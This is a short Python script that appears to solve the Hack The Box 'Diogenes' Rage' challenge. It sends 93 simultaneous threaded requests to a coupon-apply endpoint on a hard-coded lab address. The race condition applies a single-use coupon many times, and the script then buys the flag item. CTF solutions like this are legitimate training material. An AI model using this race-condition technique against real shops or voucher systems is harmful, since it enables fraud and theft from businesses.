import requests
import threading
import time
import json

# Problem Domain: Hack The Box
# Problem Name: Diogenes' Rage
# Problem Details: Having missed the flight as you walk down the street, a wild vending machine appears in your way. You check your pocket and there it is, yet another half torn voucher coupon to feed to the consumerism. You start wondering why should you buy things that you don't like with the money you don't have for the people you don't like. You're Jack's raging bile duct.

url = 'http://165.227.231.233:31757/api/purchase'
payload = {"item":"A1"}
# print(payload)
r = requests.post( url, json=payload)
# print(r.content)
# Getting the sesssion
use_ses = r.cookies;

use_header = r.headers

# print(use_header)

def my_exploit():
    url = 'http://165.227.231.233:31757/api/coupons/apply'
    payload = {"coupon_code":"HTB_100"}
    # print(payload)

    global use_ses

    r = requests.post( url, json=payload, headers=use_header, cookies=use_ses)
    print(r.text)
    # Getting the sesssion
    my_res_ses = r.cookies;

# coupon_apply()

# Creating process
all_thread = [];
for i in range(93):
   all_thread.append( threading.Thread(target=my_exploit) )

# Executing process
for p in all_thread:
    p.start()


# Check the flag
buy_url = 'http://165.227.231.233:31757/api/purchase'
buy_payload = {"item":"C8"}
# buy_payload = {"item":"A1"}
buy = requests.post( buy_url, json=buy_payload, headers=use_header, cookies=use_ses )
print('---Buying Item now----')
print(buy.text)

# threading.Thread(target=bob).start()